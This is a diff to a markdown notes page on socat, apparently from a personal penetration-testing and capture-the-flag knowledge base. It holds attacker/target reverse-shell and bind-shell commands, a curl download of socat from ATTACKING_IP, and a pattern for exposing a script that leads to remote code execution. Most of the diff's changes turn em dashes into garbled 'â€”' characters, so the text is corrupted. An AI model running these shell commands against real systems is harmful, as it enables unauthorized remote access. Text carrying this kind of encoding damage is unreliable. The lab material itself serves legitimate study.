@@ -10,23 +10,23 @@ curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
 ```
 Used on: **Wreath** - documented reverse shell relays, local forwards, quiet outbound relays, and OpenSSL-wrapped forwards.
 
-"netcat on steroids". Bidirectional stream relay between any two endpoints — TCP, UDP, UNIX socket, file, PTY, OpenSSL, child process — with PTY allocation, fork-per-connection, EOF handling and SSL all built in. The Swiss-army knife for **stable** reverse shells, port forwarding, and lab-style "host this script on a TCP port" patterns.
+"netcat on steroids". Bidirectional stream relay between any two endpoints â€” TCP, UDP, UNIX socket, file, PTY, OpenSSL, child process â€” with PTY allocation, fork-per-connection, EOF handling and SSL all built in. The Swiss-army knife for **stable** reverse shells, port forwarding, and lab-style "host this script on a TCP port" patterns.
 
 It's often pre-installed on Debian/Ubuntu derivatives. If not, drop a [static binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) the same way you'd drop nmap.
 
 ## Commands Used
 
-### Reverse shell — fully-interactive, stable PTY
+### Reverse shell â€” fully-interactive, stable PTY
 ```bash
-# Attacker — listener with PTY allocation
+# Attacker â€” listener with PTY allocation
 socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
 
 # Target
 socat TCP:$LHOST:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
 ```
-This is the gold-standard reverse shell — full TTY, no `Ctrl-C`-kills-the-shell, tab-completion, signals work. Replaces the four-step `python -c pty.spawn ; Ctrl-Z ; stty raw -echo ; fg ; reset` dance.
+This is the gold-standard reverse shell â€” full TTY, no `Ctrl-C`-kills-the-shell, tab-completion, signals work. Replaces the four-step `python -c pty.spawn ; Ctrl-Z ; stty raw -echo ; fg ; reset` dance.
 
-### Reverse shell — quick / on a stripped target
+### Reverse shell â€” quick / on a stripped target
 ```bash
 # Attacker
 nc -lvnp 4444
@@ -42,11 +42,11 @@ socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/bin/bash,pty,stderr
 socat - TCP:$TARGET:9999
 ```
 
-### "Host this script on a TCP port" — debug pattern that becomes RCE
+### "Host this script on a TCP port" â€” debug pattern that becomes RCE
 ```bash
 socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0
 ```
-Used on: **bsidesgtdevelpy** — this is what's serving the Python script on port 10000. The `EXEC:` clause re-spawns the script per connection. If the script `eval`s/`input()`s attacker bytes -> RCE. See [python-input-injection.md](../../exploits/web-rce/python-input-injection.md).
+Used on: **bsidesgtdevelpy** â€” this is what's serving the Python script on port 10000. The `EXEC:` clause re-spawns the script per connection. If the script `eval`s/`input()`s attacker bytes -> RCE. See [python-input-injection.md](../../exploits/web-rce/python-input-injection.md).
 
 ### Local port forward (akin to `ssh -L`)
 ```bash
@@ -79,7 +79,7 @@ socat UNIX-LISTEN:/tmp/sock,fork TCP:127.0.0.1:8080      # UNIX <-> TCP bridge
 | `TCP-LISTEN:port,fork,reuseaddr` | listen, accept many concurrent connections |
 | `UDP:`, `UDP-LISTEN:` | UDP variants |
 | `EXEC:cmd[,pty][,stderr][,setsid]` | spawn cmd, wire its stdio to the other side |
-| `OPENSSL:`, `OPENSSL-LISTEN:` | TLS variants — `cert=`, `key=`, `verify=` |
+| `OPENSSL:`, `OPENSSL-LISTEN:` | TLS variants â€” `cert=`, `key=`, `verify=` |
 | `UNIX-CONNECT:/path`, `UNIX-LISTEN:/path` | UNIX-domain sockets |
 | `FILE:path,creat`, `OPEN:path,append` | read / write a file as one side |
 | `STDIO`, `STDIN`, `STDOUT`, `-` | the local process's stdio |
@@ -100,7 +100,7 @@ socat UNIX-LISTEN:/tmp/sock,fork TCP:127.0.0.1:8080      # UNIX <-> TCP bridge
 ## Related
 - [netcat](netcat.md) -- the simpler cousin
 - [python-input-injection.md](../../exploits/web-rce/python-input-injection.md) -- bsidesgtdevelpy's `EXEC:` foothold
-- [ssh-tunneling.md](../../exploits/pivot/ssh-tunneling.md) -- when SSH access is also available
+- [ssh-tunneling.md](../../techniques/pivot/ssh-tunneling.md) -- when SSH access is also available
 - [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md) -- one of the static binaries you'd want inside a container
 
 
